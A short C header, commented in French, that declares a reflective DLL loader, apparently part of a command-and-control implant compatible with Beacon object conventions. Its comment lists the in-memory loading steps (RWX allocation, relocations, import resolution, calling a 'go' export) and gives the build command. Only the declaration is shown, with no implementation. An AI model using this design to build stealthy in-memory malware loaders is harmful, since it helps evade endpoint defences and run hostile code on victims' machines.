/*
 * ============================================================
 *  rdll_loader.h - Chargeur de DLL Reflectif en memoire
 *
 *  Charge une DLL PE64 depuis un buffer memoire sans passer
 *  par LoadLibrary :
 *    1. Copie les sections dans un bloc RWX alloue avec VirtualAlloc
 *    2. Applique les relocations base (IMAGE_REL_BASED_DIR64)
 *    3. Resout la table d'import (IAT) via LoadLibraryA+GetProcAddress
 *    4. Appelle DllMain(DLL_PROCESS_ATTACH)
 *    5. Trouve l'export "go" et l'execute
 *    6. Recupere la sortie via beacon_get_output() exportee par la DLL
 *    7. DllMain(DLL_PROCESS_DETACH) + VirtualFree
 *
 *  La DLL doit etre compilee avec :
 *    x86_64-w64-mingw32-gcc -shared -DRDLL_MODE -DPLATFORM_WINDOWS \
 *      mod_xxx.c beacon_compatibility.c -Wl,--export-all-symbols \
 *      -lkernel32 -luser32 -lgdi32 -ladvapi32 -o xxx.x64.dll
 * ============================================================
 */
#ifndef RDLL_LOADER_H
#define RDLL_LOADER_H

#include "execution_engine.h"

/*
 * Charge et execute une DLL reflective depuis un buffer memoire.
 * @param dll_bytes : bytes bruts de la DLL (.dll PE64)
 * @param dll_size  : taille en bytes
 * @param args      : arguments packes pour go() (format BeaconDataParse)
 * @param args_len  : taille des arguments
 */
module_result_t rdll_loader_execute(
    const unsigned char *dll_bytes, size_t dll_size,
    const unsigned char *args,      size_t args_len
);

#endif /* RDLL_LOADER_H */
